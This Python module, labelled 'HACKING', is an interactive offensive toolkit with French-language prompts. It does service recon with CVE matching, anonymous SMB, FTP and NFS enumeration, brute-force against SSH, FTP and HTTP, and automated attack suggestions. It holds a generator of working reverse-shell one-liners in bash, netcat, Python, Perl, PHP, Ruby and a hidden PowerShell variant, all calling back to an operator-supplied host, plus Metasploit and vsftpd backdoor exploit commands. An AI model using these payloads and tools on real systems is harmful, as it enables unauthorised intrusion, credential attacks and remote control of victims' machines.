# -*- coding: utf-8 -*-
# Module 16 : HACKING - exploitation IP/services
import socket, os, json, subprocess, time, re
from datetime import datetime

CVE_DB = {
    "openssh_7.2":  ["CVE-2016-6210", "CVE-2018-15473"],
    "openssh_7.4":  ["CVE-2018-15473"],
    "openssh_8.0":  ["CVE-2021-41617"],
    "openssh_8.2":  ["CVE-2021-41617"],
    "openssh_6.6":  ["CVE-2016-6210"],
    "apache_2.4.7": ["CVE-2017-7679", "CVE-2017-3167"],
    "apache_2.4.29":["CVE-2019-0211"],
    "nginx_1.18":   ["CVE-2021-23017"],
    "vsftpd_2.3.4": ["CVE-2011-2523"],
    "samba_3.0":    ["CVE-2007-2447"],
    "samba_3":      ["CVE-2017-7494"],
    "proftpd_1.3.3":["CVE-2010-4221"],
    "mysql_5.5":    ["CVE-2012-2122"],
}

def _ok(m): print(f"\033[32m[+]\033[0m {m}")
def _no(m): print(f"\033[31m[-]\033[0m {m}")
def _info(m): print(f"\033[34m[i]\033[0m {m}")
def _warn(m): print(f"\033[33m[~]\033[0m {m}")

def grab_banner(ip, port, timeout=3):
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(timeout)
        s.connect((ip, port))
        if port in (80,8080,8000,443,8443):
            s.send(b"GET / HTTP/1.0\r\nHost: "+ip.encode()+b"\r\n\r\n")
        elif port in (21,22,25,110,143): pass
        else: s.send(b"\r\n")
        data = s.recv(2048); s.close()
        return data.decode(errors="ignore").strip()
    except Exception:
        return ""

def identify_service(banner):
    b = banner.lower()
    patterns = [
        (r"openssh[_/ ]([\d\.]+)", "openssh"),
        (r"apache[/ ]([\d\.]+)", "apache"),
        (r"nginx[/ ]([\d\.]+)", "nginx"),
        (r"vsftpd[ ]([\d\.]+)", "vsftpd"),
        (r"proftpd[ ]([\d\.]+)", "proftpd"),
        (r"samba[ ]([\d\.]+)", "samba"),
        (r"mysql[ ]([\d\.]+)", "mysql"),
        (r"microsoft-iis[/ ]([\d\.]+)", "iis"),
    ]
    for pat, name in patterns:
        m = re.search(pat, b)
        if m:
            return f"{name}_{m.group(1)}"
    return None

def find_cve(service_string):
    if not service_string: return []
    key = service_string.lower()
    parts = key.split("_")
    if len(parts) >= 2:
        short = parts[0] + "_" + ".".join(parts[1].split(".")[:2])
        if short in CVE_DB: return CVE_DB[short]
    for k, cves in CVE_DB.items():
        if k.split("_")[0] == parts[0]: return cves
    return []

def recon_cible(ip, ports):
    print("\033[1m\033[31m" + "=" * 60 + "\033[0m")
    print("\033[1m\033[31m  RECONNAISSANCE IP : " + ip + "\033[0m")
    print("\033[1m\033[31m" + "=" * 60 + "\033[0m")
    findings = []
    for p in ports:
        banner = grab_banner(ip, p)
        if not banner: continue
        svc = identify_service(banner)
        cves = find_cve(svc) if svc else []
        _ok(f"Port {p} : {banner.splitlines()[0][:80]}")
        if svc: _info(f"    Service : {svc}")
        if cves: _warn(f"    CVE : {', '.join(cves)}")
        findings.append({"port":p,"banner":banner[:300],
                         "service":svc,"cves":cves})
    if findings:
        os.makedirs("output", exist_ok=True)
        with open("output/hack_recon.json","w",encoding="utf-8") as f:
            json.dump({"target":ip,"findings":findings,
                       "ts":datetime.now().isoformat()}, f, indent=2)
        _ok("Rapport : output/hack_recon.json")
    return findings

def smb_nullsession(ip):
    _info(f"SMB NullSession sur {ip}")
    if subprocess.run(["which","smbclient"], capture_output=True).returncode != 0:
        _warn("smbclient absent. Installez : sudo pacman -S samba")
        return
    try:
        out = subprocess.check_output(["smbclient","-L",f"//{ip}/","-N"],
                stderr=subprocess.STDOUT, timeout=15).decode(errors="ignore")
        print(out)
        if "Sharename" in out: _ok(f"Partages SMB anonymes sur {ip}")
        else: _no("Pas de partage anonyme")
    except Exception as e:
        _no(f"Erreur : {e}")

def smb_mount_share(ip, share, mountpoint="/tmp/smb_mount"):
    _info(f"Montage //{ip}/{share} -> {mountpoint}")
    os.makedirs(mountpoint, exist_ok=True)
    cmd = f"sudo mount -t cifs //{ip}/{share} {mountpoint} -o guest,ro"
    _info(f"Commande : {cmd}")
    subprocess.run(cmd, shell=True)

def smb_enum(ip):
    _info(f"Enumeration SMB {ip}")
    for tool, args in [("nmblookup",["-A",ip]),
                       ("smbclient",["-L",f"//{ip}/","-N"]),
                       ("rpcclient",["-U","","-N",ip,"-c","srvinfo"])]:
        if subprocess.run(["which",tool], capture_output=True).returncode != 0:
            _warn(f"{tool} absent"); continue
        try:
            print(f"\n  \033[33m--- {tool} ---\033[0m")
            out = subprocess.check_output([tool]+args,
                    stderr=subprocess.STDOUT, timeout=15).decode(errors="ignore")
            print(out[:1500])
        except Exception as e:
            _no(f"{tool} : {e}")

def ftp_anonymous(ip, port=21):
    _info(f"FTP anonyme sur {ip}:{port}")
    try:
        from ftplib import FTP
        f = FTP()
        f.connect(ip, port, timeout=10)
        f.login("anonymous","anonymous@")
        _ok("Connexion FTP anonyme reussie")
        f.dir()
        files = []
        f.retrlines("LIST", files.append)
        _info(f"{len(files)} entrees")
        f.quit()
        return files
    except Exception as e:
        _no(f"Echec : {e}")
        return []

def brute_target(ip, port, service, userlist, passlist):
    _info(f"Brute-force {service} {ip}:{port}")
    from modules.ssh_bruteforce import BruteForcer
    users = [l.strip() for l in open(userlist) if l.strip()]
    passes = [l.strip() for l in open(passlist) if l.strip()]
    bf = BruteForcer(ip, port, users, passes, service)
    return bf.run()

REVERSE_PAYLOADS = {
    "bash": "bash -i >& /dev/tcp/{lh}/{lp} 0>&1",
    "nc": "nc -e /bin/sh {lh} {lp}",
    "nc_mkfifo": "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc {lh} {lp} >/tmp/f",
    "python": "python3 -c 'import socket,subprocess,os;s=socket.socket();s.connect((\"{lh}\",{lp}));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call([\"/bin/sh\",\"-i\"])'",
    "perl": "perl -e 'use Socket;$i=\"{lh}\";$p={lp};socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));connect(S,sockaddr_in($p,inet_aton($i)));open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");exec(\"/bin/sh -i\");'",
    "php": "php -r '$sock=fsockopen(\"{lh}\",{lp});exec(\"/bin/sh -i <&3 >&3 2>&3\");'",
    "ruby": "ruby -rsocket -e'f=TCPSocket.open(\"{lh}\",{lp}).to_i;exec sprintf(\"/bin/sh -i <&%d >&%d 2>&%d\",f,f,f)'",
    "powershell": "powershell -NoP -NonI -W Hidden -Exec Bypass -Command New-Object System.Net.Sockets.TCPClient(\"{lh}\",{lp});$s=$client.GetStream();[byte[]]$b=0..65535|%{0};while(($i=$s.Read($b,0,$b.Length)) -ne 0){;$d=(New-Object -TypeName System.Text.ASCIIEncoding).GetString($b,0,$i);$sb=(iex $d 2>&1 | Out-String );$sb2=$sb+\"PS \"+(pwd).Path+\"> \";$sbt=([text.encoding]::ASCII).GetBytes($sb2);$s.Write($sbt,0,$sbt.Length);$s.Flush()}"
}

def generate_reverse_shell(lh, lp, kind=None):
    _info(f"Reverse shell vers {lh}:{lp}")
    kinds = [kind] if kind else list(REVERSE_PAYLOADS.keys())
    for k in kinds:
        if k not in REVERSE_PAYLOADS: continue
        cmd = REVERSE_PAYLOADS[k].format(lh=lh, lp=lp)
        print(f"\n  \033[1m\033[33m[{k}]\033[0m")
        print(f"  {cmd}")
    _info("Ecoute : nc -lvnp <port>")

def nfs_enum(ip):
    _info(f"Enumeration NFS {ip}")
    if subprocess.run(["which","showmount"], capture_output=True).returncode != 0:
        _warn("showmount absent. Installez : sudo pacman -S nfs-utils")
        return
    try:
        out = subprocess.check_output(["showmount","-e",ip],
                stderr=subprocess.STDOUT, timeout=15).decode(errors="ignore")
        print(out)
        _ok(f"Partages NFS sur {ip}") if "Export" in out else _no("Aucun NFS")
    except Exception as e:
        _no(f"Erreur : {e}")

EXPLOITS = {
    "vsftpd_2.3.4": {"desc":"Backdoor vsftpd 2.3.4 (CVE-2011-2523)",
        "how":"Connexion port 21 login ':)', shell port 6200",
        "cmd":"nc <ip> 21\nnc <ip> 6200"},
    "samba_3": {"desc":"SambaCry (CVE-2017-7494)",
        "how":"Necessite partage SMB inscriptible",
        "cmd":"msfconsole -x 'use exploit/linux/samba/is_known_pipename; set RHOST <ip>; run'"},
    "openssh_7.4": {"desc":"Enumeration utilisateurs OpenSSH (CVE-2018-15473)",
        "how":"Via Metasploit",
        "cmd":"msfconsole -x 'use auxiliary/scanner/ssh/ssh_enumusers; set RHOSTS <ip>; run'"},
    "apache_2.4.29": {"desc":"Apache PrivEsc (CVE-2019-0211)",
        "how":"Necessite acces local",
        "cmd":"Recherche : github.com/search?q=CVE-2019-0211"},
}

def suggest_exploits(service_string):
    if not service_string: return
    parts = service_string.lower().split("_")
    if len(parts) >= 2:
        short = parts[0] + "_" + ".".join(parts[1].split(".")[:2])
        for k, v in EXPLOITS.items():
            if k.startswith(short.split("_")[0]) or k == short:
                _warn(f"Exploit : {v['desc']}")
                _info(f"Methode : {v['how']}")
                print(f"  {v['cmd']}")

def run_interactive():
    from toolkit import ask, err, info, ok, warn, section, pause, C
    while True:
        os.system("clear" if os.name=="posix" else "cls")
        print(f"""{C.BOLD}{C.RED}
┌──────────────────────────────────────────────┐
│              HACKING - MENU                  │
├──────────────────────────────────────────────┤
│  {C.CYAN}[ 1]{C.RESET} Reconnaissance IP (services + CVE)      │
│  {C.CYAN}[ 2]{C.RESET} SMB : NullSession + partages           │
│  {C.CYAN}[ 3]{C.RESET} SMB : enumeration avancee              │
│  {C.CYAN}[ 4]{C.RESET} SMB : montage partage                  │
│  {C.CYAN}[ 5]{C.RESET} FTP anonyme                            │
│  {C.CYAN}[ 6]{C.RESET} NFS : montages exposes                 │
│  {C.CYAN}[ 7]{C.RESET} Brute-force cible (SSH/FTP/HTTP)       │
│  {C.CYAN}[ 8]{C.RESET} Reverse shell generator                │
│  {C.CYAN}[ 9]{C.RESET} Exploits suggeres par service          │
│  {C.CYAN}[10]{C.RESET} Scan complet + attaque auto            │
│  {C.CYAN}[ 0]{C.RESET} Retour                                 │
└──────────────────────────────────────────────┘{C.RESET}
Choix > """, end="")
        ch = input().strip()
        if ch == "0": return
        try:
            if ch == "1":
                ip = ask("IP cible")
                ports_in = ask("Ports", "21,22,23,25,80,110,139,143,443,445,993,995,1433,3306,3389,5432,8080,8443")
                ports = [int(p) for p in ports_in.split(",") if p.strip().isdigit()]
                recon_cible(ip, ports)
            elif ch == "2":
                smb_nullsession(ask("IP cible"))
            elif ch == "3":
                smb_enum(ask("IP cible"))
            elif ch == "4":
                ip = ask("IP cible"); share = ask("Partage")
                mp = ask("Montage", "/tmp/smb_mount")
                smb_mount_share(ip, share, mp)
            elif ch == "5":
                ip = ask("IP cible"); port = int(ask("Port", "21"))
                ftp_anonymous(ip, port)
            elif ch == "6":
                nfs_enum(ask("IP cible"))
            elif ch == "7":
                ip = ask("IP cible"); svc = ask("Service (ssh/ftp/http)", "ssh")
                dp = {"ssh":22,"ftp":21,"http":80}[svc]
                port = int(ask("Port", str(dp)))
                brute_target(ip, port, svc,
                             "payloads/wordlist_users.txt",
                             "payloads/wordlist_pass.txt")
            elif ch == "8":
                lh = ask("Votre IP"); lp = int(ask("Votre port", "4444"))
                kind = ask("Type (vide=tous)", "")
                generate_reverse_shell(lh, lp, kind or None)
            elif ch == "9":
                suggest_exploits(ask("Service (ex: openssh_7.4)"))
            elif ch == "10":
                ip = ask("IP cible")
                ports_in = ask("Ports", "21,22,80,139,443,445,3306,3389,5432,8080")
                ports = [int(p) for p in ports_in.split(",") if p.strip().isdigit()]
                findings = recon_cible(ip, ports)
                print()
                _info("Suggestions exploits :")
                for f in findings:
                    if f.get("service"): suggest_exploits(f["service"])
                print()
                _info("Tests automatiques :")
                if any(f["port"]==445 for f in findings): smb_nullsession(ip)
                if any(f["port"]==21 for f in findings): ftp_anonymous(ip)
                if any(f["port"]==2049 for f in findings): nfs_enum(ip)
        except Exception as e:
            print(f"\033[31m[!]\033[0m {e}")
        pause()